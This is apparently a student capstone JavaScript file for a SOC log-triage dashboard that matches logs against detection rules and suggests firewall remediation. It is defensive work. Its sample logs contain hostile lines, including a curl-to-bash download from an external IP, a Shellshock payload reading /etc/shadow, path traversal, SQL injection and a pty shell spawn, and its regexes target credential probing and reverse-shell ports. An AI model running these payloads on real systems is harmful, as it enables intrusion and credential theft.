/**
 * ==========================================================================
 * AegisTrace v3.0 — Next-Gen SecOps SOC Workbench
 * Client-Side Heuristic Detection Engine & Incident Triage Automation
 * Lead Architect: Ayan Mondal (CDS/INT/2026/26637504)
 * Codomax Digital Solutions — Cybersecurity Capstone
 * ==========================================================================
 */

(function () {
  'use strict';

  // --- Web Audio API Tactical Sound Synthesizer (Zero External Dependencies) ---
  let soundEnabled = false;
  let audioCtx = null;

  function initAudio() {
    if (!audioCtx && (window.AudioContext || window.webkitAudioContext)) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
  }

  function playTone(freq = 880, type = 'sine', duration = 0.08) {
    if (!soundEnabled) return;
    try {
      initAudio();
      if (!audioCtx) return;
      if (audioCtx.state === 'suspended') {
        audioCtx.resume();
      }
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
      gain.gain.setValueAtTime(0.06, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + duration);
    } catch (e) {
      // Audio autoplay policy fallback
    }
  }

  // --- Preloaded Sample Log Datasets ---
  const SAMPLE_LOGS = {
    auth: [
      'Nov 22 14:04:12 edge-srv01 sshd[28412]: Failed password for invalid user admin from 198.51.100.45 port 42814 ssh2',
      'Nov 22 14:04:14 edge-srv01 sshd[28415]: Failed password for invalid user admin from 198.51.100.45 port 42818 ssh2',
      'Nov 22 14:04:16 edge-srv01 sshd[28418]: Failed password for invalid user root from 198.51.100.45 port 42822 ssh2',
      'Nov 22 14:04:18 edge-srv01 sshd[28422]: Failed password for invalid user postgres from 198.51.100.45 port 42826 ssh2',
      'Nov 22 14:04:22 edge-srv01 sshd[28429]: Failed password for invalid user ubuntu from 198.51.100.45 port 42830 ssh2',
      'Nov 22 14:04:25 edge-srv01 sshd[28435]: Accepted password for root from 198.51.100.45 port 42834 ssh2',
      'Nov 22 14:05:01 edge-srv01 sudo[28480]: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c "curl http://185.220.101.5/mal.sh | bash"',
      'Nov 22 14:06:10 edge-srv01 systemd[1]: Started User Manager for UID 0.',
      'Nov 22 14:10:45 edge-srv01 sshd[29001]: Accepted publickey for secops-admin from 10.0.1.20 port 51200 ssh2: RSA SHA256:v8F29aLq'
    ].join('\n'),

    web: [
      '203.0.113.88 - - [22/Nov/2026:14:12:01 +0000] "GET /robots.txt HTTP/1.1" 200 482 "-" "Mozilla/5.0"',
      '203.0.113.88 - - [22/Nov/2026:14:12:03 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Nikto/2.1.6"',
      '203.0.113.88 - - [22/Nov/2026:14:12:05 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 208 "-" "Nikto/2.1.6"',
      '203.0.113.88 - - [22/Nov/2026:14:12:08 +0000] "GET /api/v1/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable"',
      '203.0.113.88 - - [22/Nov/2026:14:12:12 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2410 "-" "curl/7.88.1"',
      '203.0.113.88 - - [22/Nov/2026:14:12:15 +0000] "POST /api/v1/exec HTTP/1.1" 403 145 "-" "python-requests/2.31.0"',
      '192.168.1.105 - - [22/Nov/2026:14:14:00 +0000] "GET /dashboard HTTP/1.1" 200 15200 "https://portal.internal/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '185.220.101.5 - - [22/Nov/2026:14:15:30 +0000] "POST /cgi-bin/test-cgi HTTP/1.1" 400 320 "-" "() { :; }; /bin/bash -c \'cat /etc/shadow\'"'
    ].join('\n'),

    firewall: [
      'Nov 22 14:20:00 fw-core01 kernel: [FW-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=45.33.32.156 DST=10.0.0.50 PROTO=TCP SPT=55100 DPT=22 SYN',
      'Nov 22 14:20:01 fw-core01 kernel: [FW-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=45.33.32.156 DST=10.0.0.50 PROTO=TCP SPT=55101 DPT=80 SYN',
      'Nov 22 14:20:02 fw-core01 kernel: [FW-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=45.33.32.156 DST=10.0.0.50 PROTO=TCP SPT=55102 DPT=443 SYN',
      'Nov 22 14:20:03 fw-core01 kernel: [FW-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=45.33.32.156 DST=10.0.0.50 PROTO=TCP SPT=55103 DPT=3389 SYN',
      'Nov 22 14:20:04 fw-core01 kernel: [FW-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=45.33.32.156 DST=10.0.0.50 PROTO=TCP SPT=55104 DPT=8080 SYN',
      'Nov 22 14:21:15 fw-core01 kernel: [FW-ALLOW-OUT] IN=eth1 OUT=eth0 SRC=10.0.0.50 DST=185.220.101.5 PROTO=TCP SPT=49210 DPT=4444 PSH ACK',
      'Nov 22 14:21:40 fw-core01 kernel: [FW-ALLOW-OUT] IN=eth1 OUT=eth0 SRC=10.0.0.50 DST=185.220.101.5 PROTO=TCP SPT=49212 DPT=4444 PSH ACK',
      'Nov 22 14:22:10 fw-core01 kernel: [FW-ALLOW] IN=eth1 OUT=eth0 SRC=10.0.0.12 DST=8.8.8.8 PROTO=UDP SPT=53530 DPT=53 LEN=68'
    ].join('\n'),

    mixed: [
      'Nov 22 14:04:12 edge-srv01 sshd[28412]: Failed password for invalid user admin from 198.51.100.45 port 42814 ssh2',
      'Nov 22 14:04:14 edge-srv01 sshd[28415]: Failed password for invalid user admin from 198.51.100.45 port 42818 ssh2',
      'Nov 22 14:04:16 edge-srv01 sshd[28418]: Failed password for root from 198.51.100.45 port 42822 ssh2',
      'Nov 22 14:04:25 edge-srv01 sshd[28435]: Accepted password for root from 198.51.100.45 port 42834 ssh2',
      '203.0.113.88 - - [22/Nov/2026:14:12:03 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Nikto/2.1.6"',
      '203.0.113.88 - - [22/Nov/2026:14:12:08 +0000] "GET /api/v1/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable"',
      '203.0.113.88 - - [22/Nov/2026:14:12:12 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2410 "-" "curl/7.88.1"',
      'Nov 22 14:20:00 fw-core01 kernel: [FW-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=45.33.32.156 DST=10.0.0.50 PROTO=TCP SPT=55100 DPT=22 SYN',
      'Nov 22 14:20:01 fw-core01 kernel: [FW-DROP] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=45.33.32.156 DST=10.0.0.50 PROTO=TCP SPT=55101 DPT=80 SYN',
      'Nov 22 14:21:15 fw-core01 kernel: [FW-ALLOW-OUT] IN=eth1 OUT=eth0 SRC=10.0.0.50 DST=185.220.101.5 PROTO=TCP SPT=49210 DPT=4444 PSH ACK',
      'Nov 22 14:25:00 auth-svc auditd[1902]: USER_LOGIN pid=412 uid=0 auid=1001 ses=9 msg=\'op=login id=1001 exe="/usr/sbin/sshd" hostname=internal.corp addr=10.0.2.14 res=success\''
    ].join('\n')
  };

  // Real-time simulated attack injection lines for live demo
  const SIMULATED_ATTACKS = [
    'Nov 22 14:30:11 edge-srv01 sshd[31002]: Failed password for invalid user oracle from 198.51.100.45 port 54120 ssh2',
    '203.0.113.88 - - [22/Nov/2026:14:31:05 +0000] "GET /api/config?cmd=id;whoami HTTP/1.1" 403 214 "-" "curl/8.2.1"',
    'Nov 22 14:32:44 fw-core01 kernel: [FW-ALLOW-OUT] IN=eth1 OUT=eth0 SRC=10.0.0.50 DST=185.220.101.5 PROTO=TCP SPT=52010 DPT=1337 PSH ACK',
    '198.51.100.99 - - [22/Nov/2026:14:33:18 +0000] "POST /wp-login.php HTTP/1.1" 200 4820 "-" "python-requests/2.31.0"',
    'Nov 22 14:34:02 edge-srv01 sudo[31920]: www-data : TTY=pts/2 ; USER=root ; COMMAND=/usr/bin/python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
  ];

  // --- Threat Detection Signatures & NIST SP 800-61 Playbooks ---
  const DETECTION_RULES = [
    {
      id: 'RULE_CMD_INJECT_C2',
      name: 'Command Injection & Remote Shell Download',
      mitre: 'T1059.004 / T1105',
      severity: 'CRITICAL',
      regex: /(curl|wget).*?(\||;|>|bash|sh|mal\.sh|\/tmp|pty\.spawn)/i,
      category: 'Command & Control / Remote Execution',
      cliCommand: 'iptables -A OUTPUT -d 185.220.101.5 -j DROP && pkill -u www-data',
      playbook: [
        'Immediately quarantine host by revoking local routing or triggering endpoint network isolation.',
        'Kill active shell PID and inspect crontab / systemd persistence units.',
        'Extract binary/script hash and add external IP to perimeter firewall egress blocklist.',
        'Initiate full root forensic snapshot and credential revocation for all affected users.'
      ]
    },
    {
      id: 'RULE_SHELLSHOCK',
      name: 'Shellshock / Bash Environment Exploitation',
      mitre: 'T1190',
      severity: 'CRITICAL',
      regex: /\(\)\s*\{\s*:\s*;\s*\}\s*;/i,
      category: 'Remote Code Execution',
      cliCommand: 'iptables -I INPUT 1 -s 185.220.101.5 -j DROP',
      playbook: [
        'Block inbound traffic from attacker IP on WAF and perimeter firewalls.',
        'Verify bash patch level across legacy CGI/Web gateways.',
        'Review /etc/shadow and credential files for unauthorized access or modification.'
      ]
    },
    {
      id: 'RULE_PATH_TRAVERSAL_PASSWD',
      name: 'Arbitrary File Read / Path Traversal (/etc/passwd)',
      mitre: 'T1083 / T1005',
      severity: 'CRITICAL',
      regex: /(\.\.[\/\\]){2,}.*?(etc[\/\\]passwd|etc[\/\\]shadow|win\.ini|boot\.ini)/i,
      category: 'Data Exfiltration / Traversal',
      cliCommand: 'iptables -I INPUT 1 -s 203.0.113.88 -j DROP',
      playbook: [
        'Enforce strict path canonicalization and whitelist validation on the affected file download handler.',
        'Audit application access logs to determine if sensitive system configuration files were successfully retrieved (HTTP 200).',
        'Verify file system permissions (chroot jail or least privilege container user).'
      ]
    },
    {
      id: 'RULE_SQLI_BASIC',
      name: 'SQL Injection Signature Detected',
      mitre: 'T1190',
      severity: 'HIGH',
      regex: /(\b(UNION(\s+ALL)?\s+SELECT|OR\s+[\'\"0-9]+\s*=\s*[\'\"0-9]+|INFORMATION_SCHEMA|SLEEP\(\d+\))\b|sqlmap)/i,
      category: 'Web Application Attack',
      cliCommand: 'fail2ban-client set nginx-req-limit banip 203.0.113.88',
      playbook: [
        'Enable immediate WAF virtual patching rule blocking parameter injection patterns.',
        'Refactor database query to use parameterized prepared statements / ORM sanitization.',
        'Inspect database audit logs for unauthorized schema enumeration or table dumps.'
      ]
    },
    {
      id: 'RULE_ENV_LEAK',
      name: 'Environment & Secrets Probing (.env / wp-config)',
      mitre: 'T1552.001',
      severity: 'HIGH',
      regex: /(\.env|\.git\/config|wp-config\.php(\.bak)?|\.aws\/credentials)/i,
      category: 'Credential / Config Discovery',
      cliCommand: 'nginx -s reload # (Enforce deny-all rule on hidden dotfiles)',
      playbook: [
        'Ensure web server (Nginx/Apache) configuration outright denies access to dotfiles and configuration backups.',
        'Verify whether any exposed tokens or credentials were referenced; rotate exposed API keys if HTTP status is 200.',
        'Flag client IP for threat intelligence reputation scoring.'
      ]
    },
    {
      id: 'RULE_SUSPICIOUS_OUTBOUND_PORT',
      name: 'Suspicious High-Risk Outbound Beaconing (Port 4444/1337)',
      mitre: 'T1071.001 / T1571',
      severity: 'HIGH',
      regex: /DPT=(4444|1337|8888|31337)/i,
      category: 'Anomalous Network Egress',
      cliCommand: 'iptables -A OUTPUT -p tcp -m multiport --dports 4444,1337,8888 -j REJECT',
      playbook: [
        'Immediately terminate active stateful outbound sessions to destination IP.',
        'Identify internal source process initiating connection using netstat/ss/EDR telemetry.',
        'Cross-check destination IP against threat intelligence (VirusTotal, AlienVault, AbuseIPDB).'
      ]
    },
    {
      id: 'RULE_SSH_SUCCESS_AFTER_ROOT',
      name: 'Root Password Authentication Accepted',
      mitre: 'T1078.003',
      severity: 'HIGH',
      regex: /Accepted password for root from/i,
      category: 'Privileged Access Anomaly',
      cliCommand: 'sed -i "s/^#PermitRootLogin.*/PermitRootLogin no/" /etc/ssh/sshd_config && systemctl restart sshd',
      playbook: [
        'Disable PermitRootLogin in /etc/ssh/sshd_config (set to "no" or "prohibit-password").',
        'Require SSH keys with hardware security tokens (FIDO2/YubiKey) for administrative access.',
        'Verify authorized jump host origin IP and review recent bash history for root.'
      ]
    },
    {
      id: 'RULE_SSH_AUTH_FAIL',
      name: 'SSH Authentication Failure / Brute-Force Attempt',
      mitre: 'T1110.001',
      severity: 'MEDIUM',
      regex: /Failed password for (invalid user\s+)?(\w+) from/i,
      category: 'Credential Access / Brute Force',
      cliCommand: 'fail2ban-client set sshd banip 198.51.100.45',
      playbook: [
        'Enforce fail2ban or crowdsec rate limiting on port 22.',
        'Verify if failure count from IP exceeds threshold (>5 attempts); block IP for 24 hours.',
        'Migrate external SSH endpoint to a private VPN or Zero-Trust Network Access (ZTNA) tunnel.'
      ]
    },
    {
      id: 'RULE_SCANNER_USER_AGENT',
      name: 'Automated Vulnerability Scanner Activity (Nikto/Curl/Sqlmap)',
      mitre: 'T1595.002',
      severity: 'MEDIUM',
      regex: /(Nikto|sqlmap|masscan|Nmap|gobuster|dirbuster|python-requests)/i,
      category: 'Reconnaissance & Vulnerability Scanning',
      cliCommand: 'iptables -A INPUT -m string --string "Nikto" --algo bm -j DROP',
      playbook: [
        'Block scanner User-Agents at Cloudflare/WAF edge.',
        'Evaluate request volume to determine if targeted reconnaissance or automated internet noise.',
        'Deploy honeypot endpoints to catch and rate-limit active vulnerability scanners.'
      ]
    },
    {
      id: 'RULE_PORT_SCAN_DROPS',
      name: 'Perimeter Firewall SYN Drops / Port Scan',
      mitre: 'T1046',
      severity: 'LOW',
      regex: /\[FW-DROP\].*?PROTO=TCP.*?SYN/i,
      category: 'Network Reconnaissance',
      cliCommand: 'ipset add blacklist 45.33.32.156',
      playbook: [
        'No immediate host remediation required; edge firewall successfully dropped packets.',
        'Monitor for follow-up targeted attempts against exposed application layer ports.',
        'Aggregate scan telemetry for threat-intel IP correlation.'
      ]
    },
    {
      id: 'RULE_BENIGN_INFO',
      name: 'Authorized Administrative or Service Event',
      mitre: 'N/A',
      severity: 'INFO',
      regex: /(Accepted publickey|Started User Manager|\[FW-ALLOW\]|200\s+\d+\s+"https?:\/\/)/i,
      category: 'Routine Operation',
      cliCommand: '# No containment required for benign event',
      playbook: [
        'Event complies with normal baseline activity.',
        'Retain in cold storage log repository for forensic audit trail and compliance retention.'
      ]
    }
  ];

  // --- State ---
  let state = {
    rawLogs: '',
    parsedEvents: [],
    filteredEvents: [],
    activeFilter: 'ALL',
    searchQuery: '',
    selectedEventId: null,
    quarantinedIPs: new Set()
  };

  // --- Utility Functions ---
  function escapeHTML(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function highlightMatches(text, query) {
    if (!query) return escapeHTML(text);
    const escapedText = escapeHTML(text);
    const escapedQuery = escapeHTML(query);
    const regex = new RegExp(`(${escapedQuery.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&')})`, 'gi');
    return escapedText.replace(regex, '<mark class="search-highlight">$1</mark>');
  }

  function extractIP(line) {
    const ipMatch = line.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
    return ipMatch ? ipMatch[0] : 'N/A';
  }

  function extractUser(line) {
    const userMatch = line.match(/(?:user\s+|USER=|for\s+)([\w\-\.\_]+)/i);
    return userMatch ? userMatch[1] : 'N/A';
  }

  function extractTimestamp(line) {
    const syslogTime = line.match(/^[A-Z][a-z]{2}\s+\d+\s+\d{2}:\d{2}:\d{2}/);
    if (syslogTime) return syslogTime[0];

    const apacheTime = line.match(/\[(\d{2}\/[A-Za-z]{3}\/\d{4}:\d{2}:\d{2}:\d{2}\s+[+\-]\d{4})\]/);
    if (apacheTime) return apacheTime[1];

    const isoTime = line.match(/\d{4}-\d{2}-\d{2}[T\s]\d{2}:\d{2}:\d{2}/);
    if (isoTime) return isoTime[0];

    return '2026-11-22 14:00:00';
  }

  // --- Clock ---
  function updateClock() {
    const clockEl = document.getElementById('soc-clock-time');
    if (!clockEl) return;
    const now = new Date();
    const utcHours = String(now.getUTCHours()).padStart(2, '0');
    const utcMins = String(now.getUTCMinutes()).padStart(2, '0');
    const utcSecs = String(now.getUTCSeconds()).padStart(2, '0');
    clockEl.textContent = `UTC ${utcHours}:${utcMins}:${utcSecs}`;
  }
  setInterval(updateClock, 1000);
  updateClock();

  // --- Parse Engine ---
  function parseLogLine(line, index) {
    const trimmed = line.trim();
    if (!trimmed) return null;

    let matchedRule = null;
    for (const rule of DETECTION_RULES) {
      if (rule.regex.test(trimmed)) {
        matchedRule = rule;
        break;
      }
    }

    if (!matchedRule) {
      matchedRule = {
        id: 'RULE_GENERIC',
        name: 'Unclassified Log Record',
        mitre: 'Informational',
        severity: 'LOW',
        category: 'General System Activity',
        cliCommand: '# No remediation rule defined',
        playbook: [
          'Verify if log is expected application output.',
          'Consider tuning log filter rules if high volume.'
        ]
      };
    }

    const srcIP = extractIP(trimmed);
    const user = extractUser(trimmed);
    const timestamp = extractTimestamp(trimmed);

    return {
      id: `evt-${index + 1}-${Date.now().toString(36)}`,
      index: index + 1,
      raw: trimmed,
      timestamp: timestamp,
      srcIP: srcIP,
      user: user,
      severity: matchedRule.severity,
      threatName: matchedRule.name,
      mitre: matchedRule.mitre,
      category: matchedRule.category,
      cliCommand: matchedRule.cliCommand,
      playbook: matchedRule.playbook,
      ruleId: matchedRule.id
    };
  }

  function processLogs(rawText) {
    state.rawLogs = rawText;
    const lines = rawText.split('\n');
    const events = [];

    lines.forEach((line, idx) => {
      const parsed = parseLogLine(line, idx);
      if (parsed) events.push(parsed);
    });

    state.parsedEvents = events;
    applyFilters();
    updateMetrics();
    updateDistributionBar();
    updateThreatLevel();
    updateIoCSummary();
  }

  // --- Threat Level & DEFCON Status ---
  function updateThreatLevel() {
    const badge = document.getElementById('threat-level-badge');
    if (!badge) return;

    const critical = state.parsedEvents.filter(e => e.severity === 'CRITICAL').length;
    const high = state.parsedEvents.filter(e => e.severity === 'HIGH').length;

    if (critical > 0) {
      badge.className = 'threat-level-badge critical';
      badge.innerHTML = '<span style="color:#ff2a5f;">🚨</span> DEFCON 1 &bull; CRITICAL THREAT';
    } else if (high > 0) {
      badge.className = 'threat-level-badge';
      badge.style.color = '#ff9900';
      badge.innerHTML = '<span style="color:#ff9900;">⚠️</span> DEFCON 2 &bull; ELEVATED';
    } else {
      badge.className = 'threat-level-badge';
      badge.style.color = '#00e676';
      badge.innerHTML = '<span style="color:#00e676;">🛡️</span> DEFCON 5 &bull; NOMINAL';
    }
  }

  // --- Distribution Bar ---
  function updateDistributionBar() {
    const total = state.parsedEvents.length;
    const bar = document.getElementById('threat-dist-bar');
    if (!bar) return;

    if (total === 0) {
      bar.innerHTML = '<div class="dist-segment" style="width: 100%; background: #141c2e;"></div>';
      return;
    }

    const c = state.parsedEvents.filter(e => e.severity === 'CRITICAL').length;
    const h = state.parsedEvents.filter(e => e.severity === 'HIGH').length;
    const m = state.parsedEvents.filter(e => e.severity === 'MEDIUM').length;
    const l = state.parsedEvents.filter(e => e.severity === 'LOW').length;
    const i = state.parsedEvents.filter(e => e.severity === 'INFO').length;

    const pC = ((c / total) * 100).toFixed(1);
    const pH = ((h / total) * 100).toFixed(1);
    const pM = ((m / total) * 100).toFixed(1);
    const pL = ((l / total) * 100).toFixed(1);
    const pI = ((i / total) * 100).toFixed(1);

    bar.innerHTML = `
      <div class="dist-segment critical" style="width: ${pC}%" title="Critical: ${c} (${pC}%)"></div>
      <div class="dist-segment high" style="width: ${pH}%" title="High: ${h} (${pH}%)"></div>
      <div class="dist-segment medium" style="width: ${pM}%" title="Medium: ${m} (${pM}%)"></div>
      <div class="dist-segment low" style="width: ${pL}%" title="Low: ${l} (${pL}%)"></div>
      <div class="dist-segment info" style="width: ${pI}%" title="Info: ${i} (${pI}%)"></div>
    `;

    document.getElementById('legend-crit-cnt').textContent = `${c}`;
    document.getElementById('legend-high-cnt').textContent = `${h}`;
    document.getElementById('legend-med-cnt').textContent = `${m}`;
    document.getElementById('legend-low-cnt').textContent = `${l}`;
    document.getElementById('legend-info-cnt').textContent = `${i}`;
  }

  // --- Filtering & Search ---
  function applyFilters() {
    let list = state.parsedEvents;

    if (state.activeFilter !== 'ALL') {
      list = list.filter(evt => evt.severity.toUpperCase() === state.activeFilter);
    }

    if (state.searchQuery) {
      const q = state.searchQuery.toLowerCase();
      list = list.filter(evt =>
        evt.raw.toLowerCase().includes(q) ||
        evt.srcIP.toLowerCase().includes(q) ||
        evt.user.toLowerCase().includes(q) ||
        evt.threatName.toLowerCase().includes(q) ||
        evt.category.toLowerCase().includes(q) ||
        evt.mitre.toLowerCase().includes(q)
      );
    }

    state.filteredEvents = list;
    renderTable();
  }

  // --- Render Metrics ---
  function updateMetrics() {
    const total = state.parsedEvents.length;
    const critical = state.parsedEvents.filter(e => e.severity === 'CRITICAL').length;
    const high = state.parsedEvents.filter(e => e.severity === 'HIGH').length;
    const medium = state.parsedEvents.filter(e => e.severity === 'MEDIUM').length;
    const totalIoCs = state.parsedEvents.filter(e => e.severity === 'CRITICAL' || e.severity === 'HIGH').length;

    document.getElementById('metric-total').textContent = total;
    document.getElementById('metric-critical').textContent = critical;
    document.getElementById('metric-high').textContent = high;
    document.getElementById('metric-medium').textContent = medium;
    document.getElementById('metric-iocs').textContent = totalIoCs;
  }

  // --- Render IoC Summary List with Quarantine Action ---
  function updateIoCSummary() {
    const listEl = document.getElementById('ioc-summary-list');
    if (!listEl) return;

    const ipFrequency = {};
    state.parsedEvents.forEach(evt => {
      if (evt.srcIP && evt.srcIP !== 'N/A' && (evt.severity === 'CRITICAL' || evt.severity === 'HIGH')) {
        ipFrequency[evt.srcIP] = (ipFrequency[evt.srcIP] || 0) + 1;
      }
    });

    const sortedIPs = Object.entries(ipFrequency).sort((a, b) => b[1] - a[1]);

    if (sortedIPs.length === 0) {
      listEl.innerHTML = '<div style="font-size:0.75rem; color:var(--text-secondary); padding:0.5rem 0;">No active critical IoCs detected.</div>';
      return;
    }

    listEl.innerHTML = sortedIPs.map(([ip, count]) => {
      const isQuarantined = state.quarantinedIPs.has(ip);
      const qStatusClass = isQuarantined ? 'quarantined' : '';
      const actionText = isQuarantined ? 'Unblock' : 'Isolate';
      const actionBtnClass = isQuarantined ? '' : 'danger';

      return `
        <div class="ioc-pill-item ${qStatusClass}">
          <div class="ioc-pill-left">
            <span class="ip">${escapeHTML(ip)}</span>
            ${isQuarantined ? '<span class="tag" style="background:var(--sev-critical); color:#fff; font-size:0.6rem; padding:0.1rem 0.35rem; border-radius:3px;">QUARANTINED</span>' : ''}
          </div>
          <div class="ioc-actions">
            <button class="btn-mini" onclick="window.copyToClipboard('${escapeHTML(ip)}', 'IP copied to clipboard')" title="Copy IP">📋</button>
            <button class="btn-mini ${actionBtnClass}" onclick="window.toggleQuarantine('${escapeHTML(ip)}')" title="${actionText} IP">${actionText}</button>
          </div>
        </div>
      `;
    }).join('');
  }

  window.toggleQuarantine = function (ip) {
    if (state.quarantinedIPs.has(ip)) {
      state.quarantinedIPs.delete(ip);
      showToast(`Removed quarantine isolation for ${ip}`);
      playTone(600, 'sine', 0.05);
    } else {
      state.quarantinedIPs.add(ip);
      showToast(`Adversary IP ${ip} isolated on host firewall rule!`, 'critical');
      playTone(250, 'square', 0.15);
    }
    updateIoCSummary();
  };

  // --- Render Events Table ---
  function renderTable() {
    const tbody = document.getElementById('events-tbody');
    const countDisplay = document.getElementById('events-count-display');
    if (!tbody) return;

    countDisplay.textContent = `Showing ${state.filteredEvents.length} of ${state.parsedEvents.length} events`;

    if (state.filteredEvents.length === 0) {
      tbody.innerHTML = `
        <tr>
          <td colspan="7" style="text-align:center; padding: 2.8rem; color: var(--text-muted);">
            No security events matching current filter criteria.
          </td>
        </tr>
      `;
      return;
    }

    const q = state.searchQuery;

    tbody.innerHTML = state.filteredEvents.map(evt => {
      const sevClass = evt.severity.toLowerCase();
      const isSelected = state.selectedEventId === evt.id ? 'selected' : '';

      return `
        <tr class="event-row ${isSelected}" data-id="${evt.id}">
          <td class="time-cell">${highlightMatches(evt.timestamp, q)}</td>
          <td><span class="severity-badge ${sevClass}">${escapeHTML(evt.severity)}</span></td>
          <td class="ip-cell">${highlightMatches(evt.srcIP, q)}</td>
          <td><span style="font-family:var(--font-mono); color:var(--text-secondary);">${highlightMatches(evt.user, q)}</span></td>
          <td>
            <strong style="color:var(--text-bright);">${highlightMatches(evt.threatName, q)}</strong>
            <div style="font-size: 0.72rem; color: var(--text-secondary);">${highlightMatches(evt.category, q)}</div>
          </td>
          <td><span class="mitre-pill">${highlightMatches(evt.mitre, q)}</span></td>
          <td>
            <button class="btn btn-secondary" style="padding: 0.25rem 0.55rem; font-size: 0.72rem;" onclick="window.viewEventDetails('${evt.id}')">
              Triage &rarr;
            </button>
          </td>
        </tr>
      `;
    }).join('');

    tbody.querySelectorAll('tr.event-row').forEach(row => {
      row.addEventListener('click', (e) => {
        if (e.target.tagName !== 'BUTTON') {
          const id = row.getAttribute('data-id');
          window.viewEventDetails(id);
        }
      });
    });
  }

  // --- Modal Deep Dive & Playbook ---
  window.viewEventDetails = function (eventId) {
    const evt = state.parsedEvents.find(e => e.id === eventId);
    if (!evt) return;

    state.selectedEventId = eventId;
    renderTable();

    document.getElementById('modal-evt-id').textContent = evt.id;
    document.getElementById('modal-severity').className = `severity-badge ${evt.severity.toLowerCase()}`;
    document.getElementById('modal-severity').textContent = evt.severity;
    document.getElementById('modal-rule-name').textContent = evt.threatName;
    document.getElementById('modal-timestamp').textContent = evt.timestamp;
    document.getElementById('modal-src-ip').textContent = evt.srcIP;
    document.getElementById('modal-user').textContent = evt.user;
    document.getElementById('modal-mitre').textContent = evt.mitre;
    document.getElementById('modal-category').textContent = evt.category;
    document.getElementById('modal-raw-log').textContent = evt.raw;
    document.getElementById('modal-cli-cmd').textContent = evt.cliCommand || '# No CLI command generated';

    const playbookList = document.getElementById('modal-playbook-steps');
    playbookList.innerHTML = evt.playbook.map(step => `<li>${escapeHTML(step)}</li>`).join('');

    const modal = document.getElementById('event-detail-modal');
    modal.classList.add('active');

    if (evt.severity === 'CRITICAL') {
      playTone(440, 'sawtooth', 0.12);
    } else {
      playTone(720, 'sine', 0.05);
    }
  };

  window.closeModal = function () {
    const modal = document.getElementById('event-detail-modal');
    modal.classList.remove('active');
    state.selectedEventId = null;
    renderTable();
  };

  // --- Copy Clipboard Helper ---
  window.copyToClipboard = function (text, successMsg = 'Copied to clipboard') {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => {
        showToast(successMsg);
        playTone(900, 'sine', 0.04);
      }).catch(() => {
        fallbackCopy(text, successMsg);
      });
    } else {
      fallbackCopy(text, successMsg);
    }
  };

  function fallbackCopy(text, successMsg) {
    const el = document.createElement('textarea');
    el.value = text;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    showToast(successMsg);
    playTone(900, 'sine', 0.04);
  }

  window.copyModalCLI = function () {
    const cmd = document.getElementById('modal-cli-cmd').textContent;
    window.copyToClipboard(cmd, 'Remediation command copied to clipboard');
  };

  // --- Toast Notifications ---
  function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = 'toast';
    const icon = type === 'critical' ? '🚨' : (type === 'warning' ? '⚠️' : '🛡️');
    toast.innerHTML = `<span>${icon}</span> <span>${escapeHTML(message)}</span>`;
    container.appendChild(toast);

    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transition = 'opacity 0.3s ease';
      setTimeout(() => toast.remove(), 300);
    }, 3200);
  }

  // --- Export Utilities ---
  window.exportReport = function (format) {
    if (state.parsedEvents.length === 0) {
      showToast('No parsed security events available to export.', 'warning');
      return;
    }

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    let blob = null;
    let filename = '';

    if (format === 'markdown') {
      filename = `AegisTrace-Triage-Report-${timestamp}.md`;
      const criticalCount = state.parsedEvents.filter(e => e.severity === 'CRITICAL').length;
      const highCount = state.parsedEvents.filter(e => e.severity === 'HIGH').length;

      let md = `# AegisTrace v3.0 — SecOps Incident Triage Report\n\n`;
      md += `**Lead Architect:** Ayan Mondal (Intern ID: CDS/INT/2026/26637504)\n`;
      md += `**Organization:** Codomax Digital Solutions — Cybersecurity & Ethical Hacking Track\n`;
      md += `**Date:** ${new Date().toUTCString()}\n\n`;
      md += `## 1. Executive Summary\n\n`;
      md += `- **Total Events Analyzed:** ${state.parsedEvents.length}\n`;
      md += `- **Critical Threat Detections:** ${criticalCount}\n`;
      md += `- **High Severity Alerts:** ${highCount}\n`;
      md += `- **Isolated / Quarantined Hosts:** ${state.quarantinedIPs.size} IP(s)\n`;
      md += `- **Platform Architecture:** Client-Side Sandboxed Vercel Deployment\n\n`;
      md += `## 2. Identified Threat Signatures & Incidents\n\n`;
      md += `| Timestamp | Severity | Source IP | User | Detected Threat | MITRE ATT&CK |\n`;
      md += `| --- | --- | --- | --- | --- | --- |\n`;

      state.parsedEvents.forEach(e => {
